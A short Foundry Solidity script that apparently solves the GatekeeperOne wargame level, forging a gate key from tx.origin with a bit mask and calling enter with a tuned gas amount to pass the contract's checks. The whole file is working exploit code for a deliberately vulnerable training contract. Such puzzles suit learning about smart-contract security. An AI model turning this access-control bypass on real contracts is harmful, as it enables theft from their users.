// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";

contract Solve is Script {
    // create & run()
    function run() external {
        GatekeeperOne victim = GatekeeperOne(0x5cd0372481a0F28bE4D92c48CCc4493C39a312a5);
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        victim.enter{gas: 8191 * 10 + 256}(key);
    }
}